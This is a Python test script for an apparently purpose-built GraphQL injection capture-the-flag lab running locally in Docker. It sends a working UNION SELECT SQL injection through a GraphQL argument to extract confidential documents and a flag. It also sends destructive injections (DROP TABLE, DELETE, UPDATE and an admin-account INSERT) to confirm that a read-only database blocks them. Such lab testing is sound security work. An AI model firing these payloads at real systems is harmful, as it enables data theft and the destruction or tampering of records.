#!/usr/bin/env python3
"""
GraphQL Injection Challenge Tests
Tests for GraphQL injection vulnerability
"""

import requests
import json
import sys
import time
import subprocess
import os
from urllib.parse import urljoin


class TestGraphQLInjectionChallenge:
    """Test suite for GraphQL Injection Challenge"""
    
    def __init__(self, base_url="http://localhost:8007"):
        self.base_url = base_url
        self.graphql_url = urljoin(base_url, "/graphql")
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'GraphQL-Injection-Test/1.0'
        })
        self.tests_passed = 0
        self.tests_failed = 0
    
    def start_services(self):
        """Start Docker Compose services"""
        print("🚀 Starting GraphQL Injection Challenge...")
        try:
            # Change to challenge directory
            os.chdir('../07-graphql-injection')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'up', '-d'], 
                         check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to start services: {e}")
            return False
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def stop_services(self):
        """Stop Docker Compose services"""
        print("🧹 Cleaning up...")
        try:
            # Change to challenge directory
            os.chdir('../07-graphql-injection')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'down'], 
                         check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Warning: Failed to stop services: {e}")
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def wait_for_service(self, timeout=120):
        """Wait for the service to be ready"""
        print("⏳ Waiting for services to be ready...")
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                # Test basic GraphQL query to confirm service is ready
                response = self.graphql_query('{ documents { id title } }')
                if response.status_code == 200 and 'data' in response.json():
                    print("✅ Services are ready")
                    return True
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        
        print(f"❌ Services failed to start within {timeout}s")
        return False
    
    def graphql_query(self, query, variables=None):
        """Execute a GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        response = self.session.post(self.graphql_url, json=payload)
        return response
    
    def test_graphql_injection(self):
        """Test GraphQL injection vulnerability"""
        print("🧪 Test: GraphQL injection attack")
        
        try:
            # Test SQL injection via searchUsers parameter
            # This should inject UNION SELECT to access confidential documents
            query = '''
            query {
              searchUsers(username: "test%' UNION SELECT debug_info,title,content,confidential FROM documents WHERE confidential = 1--") {
                id
                username
                email
                role
              }
            }
            '''
            
            response = self.graphql_query(query)
            response_text = response.text
            
            # Check for successful injection - flag should appear in error message or data
            if (response.status_code == 200 and 
                ('HC{' in response_text or 'flag' in response_text.lower())):
                print("✅ PASS - SQL injection successful, flag retrieved")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - SQL injection failed")
                print(f"Response: {response_text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_drop_table_blocked(self):
        """Test that DROP TABLE is blocked by read-only database"""
        print("🧪 Test: DROP TABLE should be blocked")

        try:
            # Attempt to drop tables via SQL injection
            query = '''
            query {
              searchUsers(username: "'; DROP TABLE users; --") {
                id
                username
              }
            }
            '''

            response = self.graphql_query(query)
            response_text = response.text

            # After injection attempt, verify tables still exist
            verify_query = '{ users { id username } }'
            verify_response = self.graphql_query(verify_query)

            if verify_response.status_code == 200 and 'data' in verify_response.json():
                print("✅ PASS - DROP TABLE blocked, tables still exist")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - Tables may have been dropped")
                print(f"Response: {verify_response.text}")
                self.tests_failed += 1
                return False

        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False

    def test_delete_blocked(self):
        """Test that DELETE FROM is blocked by read-only database"""
        print("🧪 Test: DELETE FROM should be blocked")

        try:
            # Attempt to delete records via SQL injection
            query = '''
            query {
              searchUsers(username: "'; DELETE FROM users WHERE id=1; --") {
                id
                username
              }
            }
            '''

            response = self.graphql_query(query)

            # Verify user with id=1 still exists
            verify_query = '{ user(id: 1) { id username } }'
            verify_response = self.graphql_query(verify_query)
            verify_data = verify_response.json()

            if (verify_response.status_code == 200 and
                'data' in verify_data and
                verify_data['data']['user'] is not None):
                print("✅ PASS - DELETE FROM blocked, records still exist")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - Records may have been deleted")
                print(f"Response: {verify_response.text}")
                self.tests_failed += 1
                return False

        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False

    def test_update_blocked(self):
        """Test that UPDATE is blocked by read-only database"""
        print("🧪 Test: UPDATE should be blocked")

        try:
            # Get original username for user id=1
            original_query = '{ user(id: 1) { id username } }'
            original_response = self.graphql_query(original_query)
            original_data = original_response.json()
            original_username = original_data['data']['user']['username']

            # Attempt to update via SQL injection
            query = '''
            query {
              searchUsers(username: "'; UPDATE users SET username='hacked' WHERE id=1; --") {
                id
                username
              }
            }
            '''

            response = self.graphql_query(query)

            # Verify username hasn't changed
            verify_query = '{ user(id: 1) { id username } }'
            verify_response = self.graphql_query(verify_query)
            verify_data = verify_response.json()
            current_username = verify_data['data']['user']['username']

            if current_username == original_username:
                print("✅ PASS - UPDATE blocked, data unchanged")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - Data may have been updated")
                print(f"Original: {original_username}, Current: {current_username}")
                self.tests_failed += 1
                return False

        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False

    def test_insert_blocked(self):
        """Test that INSERT is blocked by read-only database"""
        print("🧪 Test: INSERT should be blocked")

        try:
            # Count users before injection attempt
            count_query = '{ users { id } }'
            count_response = self.graphql_query(count_query)
            original_count = len(count_response.json()['data']['users'])

            # Attempt to insert via SQL injection
            query = '''
            query {
              searchUsers(username: "'; INSERT INTO users (id, username, email, role) VALUES (999, 'hacker', 'hacker@evil.com', 'admin'); --") {
                id
                username
              }
            }
            '''

            response = self.graphql_query(query)

            # Verify user count hasn't changed
            verify_response = self.graphql_query(count_query)
            current_count = len(verify_response.json()['data']['users'])

            if current_count == original_count:
                print("✅ PASS - INSERT blocked, no new records")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - New records may have been inserted")
                print(f"Original count: {original_count}, Current count: {current_count}")
                self.tests_failed += 1
                return False

        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False

    def test_user_document_relationship(self):
        """Test user-document relationships reveal confidentiality filtering"""
        print("🧪 Test: User-document relationships show confidentiality filtering")
        
        try:
            query = '''
            query {
              users {
                id
                username
                email
                role
                documents {
                  id
                  title
                  confidential
                }
              }
            }
            '''
            
            response = self.graphql_query(query)
            response_data = response.json()
            
            if (response.status_code == 200 and 
                'data' in response_data and 
                'users' in response_data['data']):
                
                users = response_data['data']['users']
                
                # Find admin user (ID 3) who should have no visible documents due to confidentiality filtering
                admin_user = next((user for user in users if user['id'] == 3), None)
                
                if admin_user and len(admin_user.get('documents', [])) == 0:
                    print("✅ PASS - Admin user has no visible documents (confidential docs filtered)")
                    self.tests_passed += 1
                    return True
                else:
                    print("❌ FAIL - User-document relationship not working as expected")
                    print(f"Response: {response.text}")
                    self.tests_failed += 1
                    return False
            else:
                print("❌ FAIL - Could not retrieve user-document relationships")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def run_tests(self):
        """Run all GraphQL injection tests"""
        print("🔍 GraphQL Injection Challenge Test Runner")
        print("==========================================")
        
        if not self.start_services():
            return False
        
        try:
            if not self.wait_for_service():
                return False
            
            print("\n🧪 Running GraphQL injection tests...\n")

            # Run tests
            self.test_user_document_relationship()
            self.test_graphql_injection()

            print("\n🔒 Testing read-only database protection...\n")
            self.test_drop_table_blocked()
            self.test_delete_blocked()
            self.test_update_blocked()
            self.test_insert_blocked()

            print(f"\n📊 Test Results: {self.tests_passed} passed, {self.tests_failed} failed")
            
            if self.tests_failed > 0:
                print("❌ Some tests failed")
                return False
            else:
                print("✅ All tests passed!")
                return True
                
        finally:
            self.stop_services()


def main():
    """Main function"""
    tester = TestGraphQLInjectionChallenge()
    success = tester.run_tests()
    
    if success:
        print("\n🎉 GraphQL Injection Challenge tests completed successfully!")
        sys.exit(0)
    else:
        print("\n❌ GraphQL Injection Challenge tests failed!")
        sys.exit(1)


if __name__ == "__main__":
    main()